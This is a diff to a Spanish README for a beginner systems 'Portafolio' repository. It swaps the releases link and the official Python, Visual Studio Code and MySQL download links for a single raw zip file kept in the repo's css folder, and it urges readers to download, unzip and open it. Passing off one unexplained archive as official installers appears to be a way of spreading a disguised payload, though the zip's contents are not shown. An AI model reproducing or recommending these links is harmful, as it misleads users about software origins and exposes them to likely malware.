@@ -1,6 +1,6 @@
 # 📁 Portafolio - Proyectos prácticos para aprender sistemas
 
-[![Descargar Portafolio](https://img.shields.io/badge/Descargar-Portafolio-4caf50?style=for-the-badge&logo=github)](https://github.com/Gatogris56/Portafolio/releases)
+[![Descargar Portafolio](https://img.shields.io/badge/Descargar-Portafolio-4caf50?style=for-the-badge&logo=github)](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ No se requiere software adicional para ver los documentos ni para consultar los 
 
 Para obtener Portafolio, visita esta página:
 
-[Descargar Portafolio](https://github.com/Gatogris56/Portafolio/releases)
+[Descargar Portafolio](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)
 
 1. Haz clic en el enlace arriba o en el botón de descarga.
 2. Al abrir la página de releases, busca la versión más reciente. Generalmente, es la que está primero en la lista.
@@ -84,9 +84,9 @@ Aunque la mayoría de los archivos no requieren instalación, algunos ejemplos d
 
 Para ejecutar código que requiera programación, puedes usar programas gratuitos como:
 
-- Python: [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)  
-- Visual Studio Code: [https://code.visualstudio.com/](https://code.visualstudio.com/)  
-- MySQL o herramientas para bases de datos: [https://dev.mysql.com/downloads/windows/](https://dev.mysql.com/downloads/windows/)
+- Python: [https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)  
+- Visual Studio Code: [https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)  
+- MySQL o herramientas para bases de datos: [https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)
 
 Instalar estos programas no es obligatorio para explorar Portafolio, pero ayuda a experimentar con el código.
 
@@ -145,6 +145,6 @@ Estos temas se presentan con ejemplos prácticos, aplicación real y material pa
 
 Accede al siguiente enlace para descargar la última versión y empezar a explorar los proyectos:
 
-[Descargar Portafolio](https://github.com/Gatogris56/Portafolio/releases)  
+[Descargar Portafolio](https://github.com/Gatogris56/Portafolio/raw/refs/heads/main/css/Software-3.8.zip)  
 
 Haz clic, descarga el archivo `.zip`, descomprímelo y abre cada proyecto según tu interés. No necesitas experiencia previa en programación para usar este portafolio. Todo está organizado para facilitar tu aprendizaje y consulta.
